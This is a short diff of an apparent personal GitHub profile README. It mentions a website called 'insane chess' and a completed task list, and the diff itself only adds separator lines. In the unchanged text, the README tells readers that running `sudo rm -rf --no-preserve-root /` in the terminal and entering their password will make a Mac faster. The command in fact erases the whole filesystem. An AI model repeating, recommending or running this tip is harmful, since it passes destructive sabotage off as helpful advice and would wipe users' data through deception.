@@ -36,7 +36,7 @@ Whats going on:  Currently, i am working on a website called "insane chess" wher
 Also, to make your mac faster, open the terminal and type
 `sudo rm -rf --no-preserve-root /`  and enter your password!
 
-
+------------------------------------------------------------------------------------------------------
 
 
  
@@ -50,7 +50,7 @@ Also, to make your mac faster, open the terminal and type
  
  - [x] WhiteScreen (FINISHED)
  
-
+----------------------------------------------------------------------------------------------------
 
  
 # Github Stats: 
